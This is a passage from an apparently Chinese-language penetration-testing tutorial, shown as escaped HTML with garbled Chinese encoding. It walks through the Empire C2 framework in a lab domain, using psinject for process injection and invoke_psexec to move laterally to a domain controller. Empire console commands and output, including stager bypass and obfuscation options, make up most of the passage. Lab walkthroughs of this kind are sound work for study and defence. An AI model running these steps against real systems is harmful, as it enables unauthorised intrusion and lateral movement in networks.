&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/management/psinject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; ProcId &lt;span class=&#34;m&#34;&gt;1888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set ProcId to &lt;span class=&#34;m&#34;&gt;1888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/management/psinject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7SU3EWKV to run Task &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: 28AR64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent 7VLBMT3A checked in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 7VLBMT3A at 172.16.0.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°&lt;code&gt;testuser&lt;/code&gt;å·²ç»ä¸Šçº¿ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;invoke-psexec&#34;&gt;Invoke-PsExec&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªæ¨¡å—æ˜¯åœ¨MSFå’ŒCSä¸Šç»å¸¸ç”¨çš„ï¼Œå®˜æ–¹PsToolså·¥å…·åŒ…ä¹Ÿæœ‰PsExecï¼Œç¼ºç‚¹çš„è¯å°±æ˜¯æ‰§è¡Œåä¼šè¢«å„å¤§æ€è½¯æ£€æµ‹å’Œç•™ä¸‹ç³»ç»Ÿæ—¥å¿—ï¼Œè€Œä¸”è¿˜éœ€è¦å¼€å¯&lt;code&gt;admin$&lt;/code&gt;445 ç«¯å£å…±äº«ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä½¿ç”¨ä¸Šé¢ä¼šè¯æ³¨å…¥å¾—åˆ°çš„&lt;code&gt;hack\testuser&lt;/code&gt;ç”¨æˆ·çš„æƒé™è¿›è¡Œæ”»å‡»,ä½¿ç”¨æ¨¡å—&lt;code&gt;powershell/lateral_movement/invoke_psexec&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; interact 7VLBMT3A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/lateral_movement/invoke_psexec
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 7VLBMT3A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/rapid7/metasploit-                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              framework/blob/master/tools/psexec.rb                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Executes a stager on remote hosts using PsExec &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; functionality. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/lateral_movement/invoke_psexec                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    False                                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0029                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1035                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1077                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value              â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 7VLBMT3A           â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Command          â”‚                    â”‚ False    â”‚ Custom &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to execute on remote â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ hosts.                              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ComputerName     â”‚                    â”‚ True     â”‚ Host to execute the stager on.      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚                    â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False              â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;        â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction   â”‚ Out-String         â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default            â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default            â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ResultFile       â”‚                    â”‚ False    â”‚ Name of the file to write the       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ results to on agent machine.        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ServiceName      â”‚ Updater            â”‚ True     â”‚ The name of the service to create.  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default            â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psexec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; ComputerName dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set ComputerName to dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psexec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psexec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
